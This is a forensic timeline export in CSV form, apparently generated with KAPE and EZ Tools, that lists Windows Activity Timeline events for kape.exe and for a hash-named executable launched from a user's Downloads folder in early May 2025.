DateTime,TimestampInfo,ArtifactName,Tool,Description,DataDetails,DataPath,FileExtension,EventId,User,Computer,FileSize,IPAddress,SourceAddress,DestinationAddress,SHA1,Count,EvidencePath,RawData
2025-05-03T03:51:14.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,CopyPaste,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:40:31.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:10:43.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T03:51:14.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Desktop/KAPE/kape.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:00:57.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:00:57.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:00:57.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:14.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:00:03.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:17.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:19.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
